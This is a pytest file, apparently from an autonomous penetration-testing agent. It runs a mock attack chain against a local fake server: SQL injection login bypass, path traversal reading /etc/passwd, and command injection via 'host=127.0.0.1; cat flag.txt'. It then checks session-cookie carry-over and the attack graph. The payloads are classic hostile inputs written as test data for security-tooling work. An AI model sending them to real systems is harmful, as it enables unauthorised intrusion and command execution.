"""
End-to-End Test for the Autonomous Stateful Recursive Session Chain.

Verifies:
  1. Discovery: Open HTTP service on port 8080.
  2. Initial Exploit: /login SQLi -> Extracts session cookie and discovers /view.
  3. Session Continuity: /view request automatically carries session cookie.
  4. Capability Escalation: /view LFI grants FILE_READ and discovers /ping.
  5. Command Injection: /ping command execution carries session cookie and captures final proof.
"""

import pytest
from agent.assessment_state import (
    AssessmentState,
    AssessmentContext,
    CapabilityType,
    ServiceRecord,
    ServiceState,
    ObjectiveStatus,
    AssessmentPhase,
)
from agent.tool_executor import ToolExecutor
from tools.registry import ToolRegistry
from events.bus import EventBus
from intelligence.attack_graph import AttackGraph, NodeKind
from intelligence.hypothesis_engine import HypothesisEngine


def test_full_autonomous_recursive_session_chain():
    # 1. Setup Mock Server Environment
    server_requests = []

    def mock_http_request(method, url, headers=None, body=None, timeout=10):
        headers = headers or {}
        server_requests.append({"url": url, "headers": dict(headers), "body": body})

        # Endpoint A: /login
        if "/login" in url:
            if body and ("admin'" in body or "1=1" in body):
                return (
                    "STATUS: 200\n"
                    "HEADERS:\n"
                    "Set-Cookie: session=adm_sess_9a8f12; Path=/\n"
                    "Location: /admin\n"
                    "\n"
                    "BODY:\n"
                    "<html><body><h1>Admin Portal</h1>"
                    "<a href='/view?file=system.log'>View Logs</a>"
                    "</body></html>\n"
                    "\n"
                    "DURATION: 0.040s"
                )
            return "STATUS: 401\nHEADERS:\n\nBODY:Invalid Credentials\n\nDURATION: 0.020s"

        # Endpoint B: /view (Requires valid session cookie)
        elif "/view" in url:
            cookie = headers.get("Cookie", "")
            if "session=adm_sess_9a8f12" not in cookie:
                return "STATUS: 403\nHEADERS:\n\nBODY:Forbidden: Auth Cookie Required\n\nDURATION: 0.020s"
            if "file=" in url:
                return (
                    "STATUS: 200\n"
                    "HEADERS:\n\n"
                    "BODY:\n"
                    "root:x:0:0:root:/root:/bin/bash\n"
                    "[INFO] Internal diagnostic route available at /ping?host=127.0.0.1\n"
                    "<a href='/ping?host=127.0.0.1'>Diagnostic Ping</a>\n\n"
                    "DURATION: 0.035s"
                )

        # Endpoint C: /ping (Requires valid session cookie)
        elif "/ping" in url:
            cookie = headers.get("Cookie", "")
            if "session=adm_sess_9a8f12" not in cookie:
                return "STATUS: 403\nHEADERS:\n\nBODY:Forbidden: Auth Cookie Required\n\nDURATION: 0.020s"
            if ";" in str(body) or ";" in url or "cat" in str(body) or "cat" in url:
                return (
                    "STATUS: 200\n"
                    "HEADERS:\n\n"
                    "BODY:\n"
                    "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n"
                    "FLAG{RECURSIVE_CHAIN_VERIFIED_7B}\n"
                    "uid=0(root) gid=0(root) groups=0(root)\n\n"
                    "DURATION: 0.045s"
                )

        return "STATUS: 404\nHEADERS:\n\nBODY:Not Found\n\nDURATION: 0.010s"

    registry = ToolRegistry()
    registry.register(name="http.request", description="HTTP request tool", func=mock_http_request)

    # 2. Initialize State and ToolExecutor
    ctx = AssessmentContext(target="http://127.0.0.1:8080", scope=["127.0.0.1"])
    state = AssessmentState(context=ctx)
    executor = ToolExecutor(registry=registry, event_bus=EventBus(), config={"allow_all_targets": True})

    # Step 1: Initial Discovery
    state.services["127.0.0.1:8080/tcp"] = ServiceRecord(
        host="127.0.0.1", port=8080, protocol="tcp", service="http", state=ServiceState.OPEN
    )

    # Step 2: Exploit /login SQLi
    res1 = executor.execute(
        "http.request",
        {"method": "POST", "url": "http://127.0.0.1:8080/login", "body": "username=admin' OR 1=1--&password=x"},
        state=state
    )
    assert res1.success
    assert "Admin Portal" in res1.raw_output

    # Check that AUTHENTICATED capability is acquired and session cookie stored
    assert state.has_capability(CapabilityType.AUTHENTICATED)
    assert any("/view" in ep.url for ep in state.http_endpoints.values())

    # Step 3: Next Request to /view (NO manual cookie passed!)
    res2 = executor.execute(
        "http.request",
        {"method": "GET", "url": "http://127.0.0.1:8080/view?file=../../../../etc/passwd"},
        state=state
    )
    assert res2.success
    assert "root:x:0:0" in res2.raw_output
    # Verify cookie was automatically injected
    assert "session=adm_sess_9a8f12" in server_requests[-1]["headers"].get("Cookie", "")

    # Record FILE_READ capability
    state.record_capability(
        capability_type=CapabilityType.FILE_READ,
        source_evidence_ids=["EVID-LFI-001"],
        acquisition_action="LFI_VIEW_PASSWD",
        verified=True
    )
    assert state.has_capability(CapabilityType.FILE_READ)
    assert any("/ping" in ep.url for ep in state.http_endpoints.values())

    # Step 4: Next Request to /ping (NO manual cookie passed!)
    res3 = executor.execute(
        "http.request",
        {"method": "POST", "url": "http://127.0.0.1:8080/ping", "body": "host=127.0.0.1; cat flag.txt"},
        state=state
    )
    assert res3.success
    assert "FLAG{RECURSIVE_CHAIN_VERIFIED_7B}" in res3.raw_output
    assert "session=adm_sess_9a8f12" in server_requests[-1]["headers"].get("Cookie", "")

    # Record COMMAND_EXECUTION capability
    state.record_capability(
        capability_type=CapabilityType.COMMAND_EXECUTION,
        source_evidence_ids=["EVID-RCE-001"],
        acquisition_action="CMD_INJECTION_PING",
        verified=True
    )
    assert state.has_capability(CapabilityType.COMMAND_EXECUTION)

    # Verify Attack Graph represents entire chain
    graph = AttackGraph()
    graph.sync_from_state(state)

    sess_nodes = graph.get_nodes_by_kind(NodeKind.SESSION)
    assert len(sess_nodes) >= 1

    cap_nodes = graph.get_nodes_by_kind(NodeKind.CAPABILITY)
    assert len(cap_nodes) >= 3  # AUTHENTICATED, FILE_READ, COMMAND_EXECUTION

    ep_nodes = graph.get_nodes_by_kind(NodeKind.ENDPOINT)
    urls = [n.metadata.get("url", "") for n in ep_nodes]
    assert any("/view" in u for u in urls)
    assert any("/ping" in u for u in urls)
